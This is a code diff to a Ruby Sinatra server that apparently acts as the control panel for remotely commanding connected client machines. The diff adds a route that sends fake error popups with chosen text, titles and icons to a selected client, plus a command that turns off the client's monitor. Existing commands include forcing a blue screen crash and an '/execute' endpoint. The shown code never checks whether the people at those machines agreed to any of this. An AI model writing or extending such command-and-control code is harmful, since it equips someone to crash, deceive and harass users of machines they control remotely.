@@ -78,6 +78,36 @@ class MyServer < Sinatra::Base
     erb :vol_control, locals: { params: params }
   end
 
+  get '/generate_error' do
+    @css = ["error-generator-styles","site-after-styles"]
+    erb :error_generator, locals: { params: params }
+  end
+
+  post '/generate_error' do
+    if params.empty? || $clientsList[params[:client_id].to_i].nil?
+      @error = "Did not found client!"
+      erb :home
+    else
+      @mClient = $clientsList[params[:client_id].to_i]
+      @sendText = "#{params[:text].gsub(",","")},#{params[:title].gsub(",","")},"
+      if !params[:buttons].nil?
+        @sendText = @sendText + params[:buttons]
+      else
+        @sendText = @sendText + "0"
+      end
+      if !params[:icons].nil?
+        @sendText = @sendText + "," + params[:icons]
+      end
+      if params[:text].length > 1000 || params[:title].length > 100
+        @error = "Params too long!"
+      else
+        $semaphore.synchronize { @mClient.send_error(@sendText) }
+      end
+    end
+    @css = ["panel-styles"]
+    erb :panel, locals: {params: params}
+  end
+
   post '/execute' do
     if params.empty? || $clientsList[params[:client_id].to_i].nil?
       @error = "Did not found client!"
@@ -127,6 +157,9 @@ class MyServer < Sinatra::Base
       when "bsod"
         $semaphore.synchronize { @mClient.bsod }
         @msg = "Trying nevermind... #{@mClient.name} is just dead."
+      when "turnoffMonitor"
+        $semaphore.synchronize { @mClient.turn_off_monitor }
+        @msg = "Turning off monitor on #{@mClient.name}..."
       else
         @msg = "Błedne polecenie."
       end
